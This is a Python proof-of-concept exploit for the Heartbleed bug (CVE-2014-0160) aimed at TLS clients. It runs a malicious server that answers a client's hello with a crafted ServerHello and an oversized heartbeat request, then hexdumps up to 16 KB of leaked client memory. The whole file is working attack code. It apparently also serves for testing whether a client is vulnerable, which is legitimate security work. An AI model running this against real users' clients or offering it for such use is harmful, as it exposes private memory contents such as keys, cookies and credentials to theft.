#!/usr/bin/env python
# Exploitation of CVE-2014-0160 Heartbeat for the client
# Author: Peter Wu <peter@lekensteyn.nl>

try:
    import socketserver
except:
    import SocketServer as socketserver
import sys
import struct
import select, time

def make_hello(sslver, cipher):
    # Record
    data = '16 ' + sslver
    data += ' 00 31' # Record ength
    # Handshake
    data += ' 02 00'
    data += ' 00 2d' # Handshake length
    data += ' ' + sslver
    data += '''
    52 34 c6 6d 86 8d e8 40 97 da
    ee 7e 21 c4 1d 2e 9f e9 60 5f 05 b0 ce af 7e b7
    95 8c 33 42 3f d5 00
    '''
    data += ' '.join('{:02x}'.format(c) for c in cipher)
    data += ' 00' # No compression
    data += ' 00 05' # Extensions length
    # Heartbeat extension
    data += ' 00 0f' # Heartbeat type
    data += ' 00 01' # Length
    data += ' 01'    # mode
    return bytearray.fromhex(data.replace('\n', ''))

def make_heartbeat(sslver):
    data = '18 ' + sslver
    data += ' 00 03'    # Length
    data += ' 01'       # Type: Request
    data += ' 40 00'    # Payload Length (larger values do not work)
    return bytearray.fromhex(data.replace('\n', ''))

def hexdump(data):
    allzeroes = b'\0' * 16
    zerolines = 0

    for i in range(0, len(data), 16):
        line = data[i:i+16]
        if line == allzeroes:
            zerolines += 1
            if zerolines == 2:
                print("*")
            if zerolines >= 2:
                continue

        print("{:04x}: {:47}  {}".format(16 * i,
            ' '.join('{:02x}'.format(c) for c in line),
            ''.join(chr(c) if c >= 32 and c < 127 else '.' for c in line)))

class TCPSvr(socketserver.BaseRequestHandler):
    def handle(self):
        remote_addr, remote_port = self.request.getpeername()
        print("Connection from: {}:{}".format(remote_addr, remote_port))

        # Read TLS record header
        hdr = self.request.recv(5)
        content_type, ver, rec_len = struct.unpack('>BHH', hdr)
        if not self.expect(content_type == 22, "Handshake type"):
            return

        # Read handshake
        hnd = self.request.recv(rec_len)
        hnd_type, len_high, len_low, ver = struct.unpack('>BBHH', hnd[:6])
        if not self.expect(hnd_type == 1, "Client Hello"):
            return
        # hnd[6:6+32] is Random
        off = 6 + 32
        sid_len, = struct.unpack('B', hnd[off:off+1])
        off += 1 + sid_len # Skip length and SID
        ciphers_len = struct.unpack("<H", hnd[off:off+2])
        off += 2
        # The first cipher is fine...
        cipher = bytearray(hnd[off:off+2])

        sslver = '{:02x} {:02x}'.format(ver >> 8, ver & 0xFF)

        # (1) Handshake: ServerHello
        self.request.sendall(make_hello(sslver, cipher))

        # (skip Certificate, etc.)

        # (2) HeartbeatRequest
        self.request.sendall(make_heartbeat(sslver))

        # (3) Buggy OpenSSL will throw 0x4000 bytes, fixed ones stay silent
        if not self.read_memory(self.request, 5):
            print("Possibly not vulnerable")

        print("")

    def read_memory(self, sock, timeout):
        end_time = time.time() + timeout
        buffer = bytearray()
        wanted_bytes = 0x4000

        while wanted_bytes > 0 and timeout > 0:
            rl, _, _ = select.select([sock], [], [], timeout)

            if not rl:
                break

            data = rl[0].recv(wanted_bytes)
            if not data: # EOF
                break
            buffer += data
            wanted_bytes -= len(data)
            timeout = end_time - time.time()

        hexdump(buffer)
        return len(buffer) > 0

    def expect(self, cond, what):
        if not cond:
            print("Expected " + what)
            self.request.close()
        return cond


def serve(port):
    addr = ('', port)
    server = socketserver.TCPServer(addr, TCPSvr)
    server.serve_forever()

if __name__ == '__main__':
    port = 4433
    if len(sys.argv) > 1:
        port = int(sys.argv[1])
    serve(port)
